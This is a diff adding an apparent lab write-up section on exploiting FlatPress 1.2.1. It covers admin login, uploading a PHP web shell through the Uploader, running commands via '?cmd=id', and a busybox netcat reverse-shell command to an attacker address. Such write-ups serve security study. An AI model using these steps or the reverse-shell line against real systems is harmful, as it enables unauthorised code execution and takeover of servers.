@@ -51,6 +51,30 @@ After attempting the above credentials, the successful login was "admin/password
 
 # Service Enumeration
 
+Since we have a login on the FlatPress site as an admin, we can research potential vulnerabilities known on our currention site version.
+
+According to multiple sources, Flatpress version 1.2.1 is vulnerable to remote code execution.
+We can follow the steps explained in this proof of concept(PoC) by *s4n-h4xor* -> https://github.com/flatpressblog/flatpress/issues/152
+
+In the PoC, we can see that the exploit can be run using an uploaded .php file with malcious code in the "Uploder" section. Additionally, there is an example PHP payload file that can be copied for ease of use. Let's create our own copy and name it, "exploit.php"
+
+	touch exploit.php
+	vim exploit.php
+*Enter the payload information as previously noted*
+
+Now that the file is created, we upload and click the file to execute the upload. Upon clicking on the file, we land on a new page with the file content printed to the screen. 
+
+To fully implement the exploit, we must edit the url to include, "?cmd=id."
+
+Since we have already called for the "cmd" command to be run in the *exploit.php* file as an injection, we now need to choose the command to run. 
+
+In this case, we have chose "id" to see if the exploit is working. Now refresh the page.
+
+With luck, the exploit outputs the group information of the currently logged-in user and we confirm the target machine is executing remote commands.
+
+After several attempts, we can achieve a remote shell using the below busybox command:
+
+	busybox nc 192.168.XXX.XXX 80 -e /bin/bash
 
 
 # Privilege Escalation
